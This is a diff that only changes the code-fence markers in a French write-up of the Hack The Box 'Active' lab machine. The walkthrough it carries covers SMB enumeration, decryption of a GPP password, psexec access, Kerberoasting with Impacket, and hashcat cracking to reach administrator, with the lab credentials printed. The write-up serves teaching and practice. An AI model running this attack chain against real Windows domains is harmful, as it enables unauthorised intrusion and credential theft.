@@ -11,7 +11,7 @@ Au moment de ces lignes je boucle la liste des CTF basés sur Windows actuelleme
 
 Ce CTF baptisé *Active* et donc basé sur Windows m'a permis de découvrir une nouvelle fois des particularités de cet OS sur le plan pentest, et ça tombe bien car c'était l'objectif :)  
 
-```plain
+```
 Nmap scan report for 10.10.10.100
 Host is up (0.028s latency).
 Not shown: 64560 closed ports, 952 filtered ports
@@ -67,7 +67,7 @@ Nmap done: 1 IP address (1 host up) scanned in 240.18 seconds
 
 On remarque du LDAP, fouillons un peu plus avec un script Nmap spécifique :  
 
-```plain
+```
 devloop@kali:~/Documents$ nmap -p 389 --script ldap-rootdse 10.10.10.100
 Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-10 17:14 CEST
 Nmap scan report for active.htb (10.10.10.100)
@@ -166,7 +166,7 @@ Cela nous servira plus tard si jamais on veut faire des requêtes sur le LDAP.
 
 Mais jetons d'abord un œil sur SMB pour savoir s'il y a des partages :  
 
-```plain
+```
 $ smbclient -L //10.10.10.100 -U "" -N
 WARNING: The "syslog" option is deprecated
 
@@ -186,7 +186,7 @@ Failed to connect with SMB1 -- no workgroup available
 
 La plupart nécessitent une authentification mais pas le partage *Replication* :  
 
-```plain
+```
 $ smbclient  -U "" -N '//10.10.10.100/replication'
 WARNING: The "syslog" option is deprecated
 Try "help" to get a list of possible commands.
@@ -200,7 +200,7 @@ smb: \> ls
 
 J'ai préféré ouvrir le gestionnaire de fichier puis recopier la totalité des fichiers en local. On trouve l'arborescence suivante et les types de fichiers suivants :  
 
-```plain
+```
 $ tree
 .
 ├── DfsrPrivate
@@ -245,7 +245,7 @@ $ tree
 
 Le fichier template GPT ne nous est pas super utile mais donne des indications sur la dureté des mots de passe et leur absence de stockage au format LM :  
 
-```plain
+```
 [Unicode]
 Unicode=yes
 [System Access]
@@ -285,14 +285,14 @@ Le fichier *Groups.xml* semble plus utile, avec un mot de passe qui semble encod
 
 En cherchant sur le web je finis par trouver exactement ce que je veux, à savoir [un script Python pour déchiffrer ce pass](https://github.com/leonteale/pentestpackage/blob/master/Gpprefdecrypt.py) :  
 
-```plain
+```
 $ python Gpprefdecrypt.py edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
 GPPstillStandingStrong2k18
 ```
 
 On a finalement un couple login/password qui s'avère valide. On peut ainsi accéder au partage *users* :  
 
-```plain
+```
 $ smbclient  -U "SVC_TGS" '//10.10.10.100/users'
 WARNING: The "syslog" option is deprecated
 Enter WORKGROUP\SVC_TGS's password:
@@ -318,7 +318,7 @@ Kansas City Shuffle
 
 Testons cet identifiant via psexec :  
 
-```plain
+```
 $ python /usr/share/doc/python-impacket/examples/psexec.py active.htb/SVC_TGS:GPPstillStandingStrong2k18@10.10.10.100
 Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
 
@@ -352,7 +352,7 @@ Pour avoir lu pas mal d'articles traitant de Windows/Kerberos, c'était compréh
 
 La suite [Impacket](https://github.com/CoreSecurity/impacket) dispose de différents scripts liés à l'énumération/l'exploitation Windows dont certains directement relatifs à Kerberos.  
 
-```plain
+```
 devloop@kali:~/Downloads/impacket-impacket_0_9_17$ PYTHONPATH=. python examples/GetUserSPNs.py -dc-ip 10.10.10.100 -outputfile /tmp/hashes.txt ACTIVE.htb/SVC_TGS:GPPstillStandingStrong2k18
 Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies
 
@@ -367,7 +367,7 @@ Ici on voit CIFS (partage de fichier) tournant avec le compte Administrator.
 
 Impacket nous livre le ticket dans un format directement brute-forcable avec hashcat :  
 
-```plain
+```
 $krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$3ec305740a094af09edd9778826a802--- snip ---869543e0b63
 ```
 
@@ -375,7 +375,7 @@ On lance alors hashcat avec la commande *hashcat64.bin -m 13100 -a 0 /tmp/hashes
 
 Cela nous donne le mot de passe *Ticketmaster1968* que l'on peut cette fois utiliser avec *psexec* :  
 
-```plain
+```
 devloop@kali:~/Downloads/impacket-impacket_0_9_17$ PYTHONPATH=. python examples/psexec.py active.htb/administrator:Ticketmaster1968@10.10.10.100
 Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies
 
